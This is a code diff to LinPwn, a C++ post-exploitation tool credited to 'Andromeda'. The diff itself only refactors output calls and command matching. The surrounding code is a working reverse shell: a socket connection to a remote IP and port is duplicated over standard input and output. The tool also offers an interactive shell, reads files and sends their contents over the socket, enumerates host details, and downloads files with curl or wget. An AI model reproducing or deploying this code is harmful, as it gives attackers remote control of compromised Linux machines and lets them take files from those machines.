@@ -32,8 +32,10 @@
 #include <string>
 
 #define BUFFER 200
-#define SD 0
 
+int sd() {
+  return 0;
+}
 
 void get_input(char *option) {
   fgets(option, BUFFER, stdin);
@@ -48,26 +50,26 @@ void get_input(char *option) {
 void new_line() {
   std::string newline = "\n";
 
-  write(SD, newline.data(), newline.length());
+  write(sd(), newline.data(), newline.length());
 }
 
 void seperate() {
   std::string seperator = "====================================="
       "======================================\n";
 
-  write(SD, seperator.data(), seperator.length());
+  write(sd(), seperator.data(), seperator.length());
 }
 
 void green() {
   std::string green = "\x1b[32m ";
 
-  write(SD, green.data(), green.length());
+  write(sd(), green.data(), green.length());
 }
 
 void none() {
   std::string none = "none\n";
 
-  write(SD, none.data(), none.length());
+  write(sd(), none.data(), none.length());
 }
 
 void help() {
@@ -78,12 +80,12 @@ void help() {
   std::string exits = "exit - or press ^C to quit LinPwn.\n";
 
   new_line();
-  write(SD, options.data(), options.length());
+  write(sd(), options.data(), options.length());
   seperate();
-  write(SD, banner.data(), banner.length());
-  write(SD, modules.data(), modules.length());
-  write(SD, clear.data(), clear.length());
-  write(SD, exits.data(), exits.length());
+  write(sd(), banner.data(), banner.length());
+  write(sd(), modules.data(), modules.length());
+  write(sd(), clear.data(), clear.length());
+  write(sd(), exits.data(), exits.length());
   new_line();
 }
 
@@ -106,7 +108,7 @@ class Banner {
   void get_banner() {
     std::string title = "\x1b[32mLinPwn\nCreated By Andromeda.\n";
 
-    write(SD, title.data(), title.length());
+    write(sd(), title.data(), title.length());
     new_line();
   }
 
@@ -122,18 +124,18 @@ class Banner {
     std::string systems = "System: ";
     std::string space = " ";
 
-    write(SD, systems.data(), systems.length());
-    write(SD, sysname.data(), sysname.length());
-    write(SD, space.data(), space.length());
-    write(SD, nodename.data(), nodename.length());
-    write(SD, space.data(), space.length());;
-    write(SD, release.data(), release.length());
-    write(SD, space.data(), space.length());
-    write(SD, version.data(), version.length());
-    write(SD, space.data(), space.length());
-    write(SD, machine.data(), machine.length());
-    write(SD, space.data(), space.length());
-    write(SD, domainname.data(), domainname.length());
+    write(sd(), systems.data(), systems.length());
+    write(sd(), sysname.data(), sysname.length());
+    write(sd(), space.data(), space.length());
+    write(sd(), nodename.data(), nodename.length());
+    write(sd(), space.data(), space.length());;
+    write(sd(), release.data(), release.length());
+    write(sd(), space.data(), space.length());
+    write(sd(), version.data(), version.length());
+    write(sd(), space.data(), space.length());
+    write(sd(), machine.data(), machine.length());
+    write(sd(), space.data(), space.length());
+    write(sd(), domainname.data(), domainname.length());
     new_line();
   }
 
@@ -141,14 +143,14 @@ class Banner {
     std::string env = "User: ";
     std::string username = getenv("USER");
 
-    write(SD, env.data(), env.length());
+    write(sd(), env.data(), env.length());
 
     if (!getenv("USER")) {
       none();
       return;
     }
 
-    write(SD, username.data(), username.length());
+    write(sd(), username.data(), username.length());
     new_line();
   }
 
@@ -157,8 +159,8 @@ class Banner {
     std::string env = "UID: ";
     std::string uidstr = std::to_string(uid);
 
-    write(SD, env.data(), env.length());
-    write(SD, uidstr.data(), uidstr.length());
+    write(sd(), env.data(), env.length());
+    write(sd(), uidstr.data(), uidstr.length());
     new_line();
   }
 
@@ -166,14 +168,14 @@ class Banner {
     std::string env = "Pwd: ";
     std::string pwd = getenv("PWD");
 
-    write(SD, env.data(), env.length());
+    write(sd(), env.data(), env.length());
 
     if (!getenv("PWD")) {
       none();
       return;
     }
 
-    write(SD, pwd.data(), pwd.length());
+    write(sd(), pwd.data(), pwd.length());
     new_line();
   }
 
@@ -181,14 +183,14 @@ class Banner {
     std::string env = "Home: ";
     std::string home = getenv("HOME");
 
-    write(SD, env.data(), env.length());
+    write(sd(), env.data(), env.length());
 
     if (!getenv("HOME")) {
       none();
       return;
     }
 
-    write(SD, home.data(), home.length());
+    write(sd(), home.data(), home.length());
     new_line();
   }
 
@@ -196,14 +198,14 @@ class Banner {
     std::string env = "Shell: ";
     std::string shell = getenv("SHELL");
 
-    write(SD, env.data(), env.length());
+    write(sd(), env.data(), env.length());
 
     if (!getenv("SHELL")) {
       none();
       return;
     }
 
-    write(SD, shell.data(), shell.length());
+    write(sd(), shell.data(), shell.length());
     new_line();
   }
 
@@ -211,14 +213,14 @@ class Banner {
     std::string env = "Term: ";
     std::string term = getenv("TERM");
 
-    write(SD, env.data(), env.length());
+    write(sd(), env.data(), env.length());
 
     if (!getenv("TERM")) {
       none();
       return;
     }
 
-    write(SD, term.data(), term.length());
+    write(sd(), term.data(), term.length());
     new_line();
   }
 
@@ -226,14 +228,14 @@ class Banner {
     std::string env = "Path: ";
     std::string path = getenv("PATH");
 
-    write(SD, env.data(), env.length());
+    write(sd(), env.data(), env.length());
 
     if (!getenv("PATH")) {
       none();
       return;
     }
 
-    write(SD, path.data(), path.length());
+    write(sd(), path.data(), path.length());
     new_line();
   }
 };
@@ -246,7 +248,7 @@ class Connection {
     address.sin_addr.s_addr = inet_addr(ip);
     address.sin_port = htons(port);
     connect(connecting, (struct sockaddr *)&address, sizeof(address));
-    dup2(connecting, SD);
+    dup2(connecting, sd());
     dup2(connecting, 1);
   }
 
@@ -267,12 +269,12 @@ class Commands {
     std::string download = "download - Downloads a file\n";
 
     new_line();
-    write(SD, modules.data(), modules.length());
+    write(sd(), modules.data(), modules.length());
     seperate();
-    write(SD, shell.data(), shell.length());
-    write(SD, read_file.data(), read_file.length());
-    write(SD, enumerate.data(), enumerate.length());
-    write(SD, download.data(), download.length());
+    write(sd(), shell.data(), shell.length());
+    write(sd(), read_file.data(), read_file.length());
+    write(sd(), enumerate.data(), enumerate.length());
+    write(sd(), download.data(), download.length());
     new_line();
   }
 
@@ -283,11 +285,11 @@ class Commands {
     char option[BUFFER];
     const char *errors = " 2>&0";
 
-    write(SD, exe.data(), exe.length());
-    write(SD, exits.data(), exits.length());
+    write(sd(), exe.data(), exe.length());
+    write(sd(), exits.data(), exits.length());
 
     for (;;) {
-      write(SD, shell.data(), shell.length());
+      write(sd(), shell.data(), shell.length());
       green();
       get_input(option);
 
@@ -307,11 +309,11 @@ class Commands {
     std::string exits = "Type exit to return to LinPwn.\n";
     char option[BUFFER];
 
-    write(SD, contents.data(), contents.length());
-    write(SD, exits.data(), exits.length());
+    write(sd(), contents.data(), contents.length());
+    write(sd(), exits.data(), exits.length());
 
     for (;;) {
-      write(SD, read.data(), read.length());
+      write(sd(), read.data(), read.length());
       green();
       get_input(option);
 
@@ -340,8 +342,8 @@ class Commands {
       return;
     }
 
-    write(SD, error0.data(), error0.length());
-    write(SD, error1.data(), error1.length());
+    write(sd(), error0.data(), error0.length());
+    write(sd(), error1.data(), error1.length());
     return;
   }
 
@@ -361,12 +363,12 @@ class Commands {
     } else if (check_wget) {
       strncat(command, wget, BUFFER);
     } else {
-      write(SD, curl_error.data(), curl_error.length());
+      write(sd(), curl_error.data(), curl_error.length());
       return;
     }
 
-    write(SD, url.data(), url.length());
-    write(SD, downloads.data(), downloads.length());
+    write(sd(), url.data(), url.length());
+    write(sd(), downloads.data(), downloads.length());
     green();
     get_input(option);
     strncat(command, option, BUFFER);
@@ -384,7 +386,7 @@ class Commands {
     FILE *file = fopen(option, "rb");
 
     if (!file) {
-      write(SD, error.data(), error.length());
+      write(sd(), error.data(), error.length());
       return;
     }
 
@@ -395,7 +397,7 @@ class Commands {
 
     fread(filecontent, 1, size, file);
     filecontent[size] = '\0';
-    send(SD, filecontent, size, 0);
+    send(sd(), filecontent, size, 0);
     fclose(file);
     delete[] filecontent;
   }
@@ -407,29 +409,30 @@ int handler() {
   std::string not_valid = "\x1b[33mNot a valid option\n";
   char *option = new char[BUFFER];
   get_input(option);
+  const int size = strnlen(option, BUFFER) + 1;
 
-  if (strncmp(option, "shell\0", 6) == 0)
+  if (strncmp(option, "shell\0", size) == 0)
     commands.shell();
-  else if (strncmp(option, "readfile\0", 9) == 0)
+  else if (strncmp(option, "readfile\0", size) == 0)
     commands.read_file();
-  else if (strncmp(option, "enumerate\0", 9) == 0)
+  else if (strncmp(option, "enumerate\0", size) == 0)
     commands.enumeration();
-  else if (strncmp(option, "modules\0", 9) == 0)
+  else if (strncmp(option, "modules\0", size) == 0)
     commands.list_Modules();
-  else if (strncmp(option, "download\0", 9) == 0)
+  else if (strncmp(option, "download\0", size) == 0)
     commands.download();
-  else if (strncmp(option, "exit\0", 5) == 0)
+  else if (strncmp(option, "exit\0", size) == 0)
     return 1;
-  else if (strncmp(option, "clear\0", 6) == 0)
+  else if (strncmp(option, "clear\0", size) == 0)
     system("clear");
-  else if (strncmp(option, "help\0", 5) == 0)
+  else if (strncmp(option, "help\0", size) == 0)
     help();
-  else if (strncmp(option, "banner\0", 7) == 0)
+  else if (strncmp(option, "banner\0", size) == 0)
     banner.print_banner();
-  else if (strncmp(option, "", 1) == 0)
+  else if (strncmp(option, "", size) == 0)
     return 0;
   else
-    write(SD, not_valid.data(), not_valid.length());
+    write(sd(), not_valid.data(), not_valid.length());
 
   delete[] option;
   return 0;
@@ -439,7 +442,7 @@ void main_loop() {
   std::string linpwn = "\x1b[31m(LinPwn) >";
 
   do {
-    write(SD, linpwn.data(), linpwn.length());
+    write(sd(), linpwn.data(), linpwn.length());
     green();
   } while (handler() != 1);
 }
